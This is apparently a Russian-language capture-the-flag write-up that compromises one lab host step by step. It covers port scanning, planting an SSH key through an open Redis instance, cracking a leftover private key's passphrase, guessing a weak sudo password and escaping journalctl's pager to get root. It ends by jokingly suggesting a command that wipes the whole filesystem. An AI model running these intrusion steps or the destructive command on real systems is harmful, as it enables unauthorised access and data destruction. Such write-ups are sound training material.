# 1) Скан портов

Используем [masscan](https://github.com/robertdavidgraham/masscan) для сканирования портов:

`masscan -e eth0 -p1-65535,U:1-65535 188.130.155.109 --rate=1000`
Аргументы:
 - e: Интерфейс, узнаём с помощью `ip a`
 - p: Порты, которые хотим сосканить, указываем U для обнаружения UDP портов
 - rate: Количество пакетов в секунду

Вывод:
```
$ sudo masscan -e eth0 -p1-65535,U:1-65535 188.130.155.109 --rate=500
 
Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-14 09:42:59 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 188.130.155.109                                 
Discovered open port 6379/tcp on 188.130.155.109                               
Discovered open port 80/tcp on 188.130.155.109                                 
Discovered open port 8080/tcp on 188.130.155.109                               
Discovered open port 4444/tcp on 188.130.155.109                               
Discovered open port 8090/tcp on 188.130.155.109 
```

Используем [nmap](https://nmap.org), чтобы обнаружить, какие сервисы висят на портах 22, 80, 4444, 6379, 8080, 8090

`nmap -Pn -sV -p22,6379,80,8080,4444,8090 188.130.155.109`
Аргументы:
 - Pn: Расценивать все хосты как работающие - пропустить обнаружение хостов
 - sV: Исследовать открытые порты для определения информации о службе/версии
 - p <диапазон_портов>: Сканирование только определенных портов

Вывод:
```
$ nmap -Pn -sV -p22,6379,80,8080,4444,8090 188.130.155.109
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 14:52 +05
Nmap scan report for 188.130.155.109
Host is up (0.043s latency).
 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
4444/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store 6.0.6
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
8090/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds
```
# 2) Получаем доступ к пользователю redis

На прошлом шаге выянилось, что порт 6379 открыт и его использует сервис redis. Пробуем подключиться с помощью команды `redis-cli -h 188.130.155.109`. После ключа `h` указывается хост.

```
$ redis-cli -h 188.130.155.109

188.130.155.109:6379> config get dbfilename
1) "dbfilename"
2) "authorized_keys"
```

Подключаемся, вводим команду `config get dbfilename`, понимаем, что мы точно подключились.

Вводим команду `config get dir`, чтобы понять, в какой директории лежит наш файл

```
188.130.155.109:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

Наш файл лежит в категории `.ssh`, а значит, так как файл redis хранит сырые поля, мы можем добавить в бд любой ключ со значением, равным нашему сгенерированному публичному ключу ssh. Стоит поставить вокруг парочку символов перевода строки, чтобы ничего не путалось с самим файлом.

```
188.130.155.109:6379> set prikolyumba "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDseW80qMhYml0sJbaUo169/FU6evho5F6UEcB78UL/ni3XikwcYKFpamC6GvSbpv96h/r3Fbuva9gLxQX3YgCm4gZL4M5mPIb5Qi+P6U9WLRqc6cQ60JIRXBuY/Q64JGfbX5dQXZY2c3zBVMdlKISBx+JDnV2lB0LAC7ANVI7A8HVVpLON3vtbMzjEI3cKDjz8JXc+W2a+fDN0JQKxneAC9OI3jQYpzwbKBEUF4JYNHF3D4CEf+gzOeCcfl0PMAdvI2m7vuauC06M0nkz+HiaCWeloNbYE1YsIdbSR/ExFYLbKNPYdScgbKroUC/RcOxrWqVnrZCMwH1ImXsd5ouFEcsU86akhxj/mM18FRDYLxT7QL522TqpvcX3TzngRBOjIIY1husXXm65F8dJEI6n0DUsJMUcrraiykRHICznT174FYsShJDWGFAqFo53GXW/aWjk55IcV4bibFUGfq3ONeJdEcl66eMVXrUZxHicJCdSpfAcr6mXEUmIx6wlmYEE= diduk001@diduk001-kali\n\n\n"
 
OK
188.130.155.109:6379>
```

Теперь мы можем подключиться к 188.130.155.109 на порт 4444 с юзером redis и нашим частным ключом:
`ssh -i ~/.ssh/id_rsa -p 4444 redis@188.130.155.109`

Ключи:
 - i: Путь до частного ключа
 - p: Порт

Подключившись, проверим директорию `/home`

В ней есть только один пользователь - `test`

Не понятно что с ним делать, но запомним его, возможно он пригодится.

Проверим содержимое `/tmp`:

`cd /tmp`

`ls -la`

Видим интересный файл `id_rsa.bak`

Выводим его содержимое:

`cat id_rsa.bak`

Получаем приватный какого-то пользователя, нетрудно догадаться что этот ключ принадлежит пользователю `test`

Копируем его к себе на машину, подключаемся к серверу от пользователя `test`:

`ssh -i id_rsa.bak test@188.130.155.109 -p 4444`

У нас запрашивают пароль. Нот гуд.

Используем тул John The Ripper чтобы ~~переиграть и уничтожить~~ получить пароль (https://github.com/magnumripper/JohnTheRipper):

`python ssh2john.py id_rsa.bak > id_rsa.hash`

`john id_rsa.hash`

Получаем пароль `pokemon`

Подключаемся к серверу от пользователя `test`

`ssh -i id_rsa.bak test@188.130.155.109`

Вводим пароль `pokemon`

Мы в системе.

Первым делом прописываем ~~whoami~~ `id`

Хотя нет. Сначала `/bin/bash` чтобы не лишиться глаз, а потом уже `id`

Пользователь `test` состоит в группе `sudo`

Попробуем выполнить ~~sudo rm -rf~~ `sudo /bin/bash`

Нас попросят ввести пароль. Here we go again.

Я всегда чекаю дефолтные пароли по типу

```
123
1234
12345
qwerty1
qwerty12
qwerty123
qwerty1234
qwerty12345
pass
password
root
toor
ubuntu
```

И парочку аналогичных.

В этот раз повезло: пароль `qwerty123`

Запускаем `sudo /bin/bash` и получаем `Permission denied`

Проверим, что мы можем запускать под `sudo`:

`sudo -l`

Получяем лишь одну команду: `journalctl -n15`

Не совсем понятно зачем нам последние 15 строк логов, ~~но разраб таска точно хотел что-то этим сказать~~ попробуем их вывести

`sudo journalctl -n15`

Вспомним про `more`: он позволяет выполнять команды при помощи `!exec`

Но ~~черт побери~~ у нас стоит ограничение на 15 строк, и мы не можем это использовать... или все-такие можем?

Уменьшим высоту терминала до минимально допустимой и снова выполним `sudo journalctl -n15`

Мы видим заветное `more`!

Осталось лишь прописать `!exec /bin/bash` и мы уже под `root`

Это победа!

По желанию можно прописать

`rm -rf --no-preserve-root /`

и наслаждаться удалением системы в прямом эфире.

